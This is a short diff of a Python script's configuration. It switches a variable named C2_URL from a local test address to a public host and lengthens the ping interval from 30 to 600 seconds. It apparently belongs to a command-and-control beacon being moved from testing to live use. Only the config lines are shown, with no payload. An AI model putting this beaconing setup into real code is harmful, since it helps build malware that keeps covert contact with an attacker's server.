@@ -23,8 +23,8 @@ import json
 # ─────────────────────────────────────────────────────────
 #  CONFIG
 # ─────────────────────────────────────────────────────────
-C2_URL = "http://192.168.1.7:5000/ping"
-PING_INTERVAL = 30   # seconds between pings (5 for testing)
+C2_URL = "http://cadminium.pages.dev/ping"
+PING_INTERVAL = 600   # seconds between pings (5 for testing)
 # ─────────────────────────────────────────────────────────
 
 def is_connected():
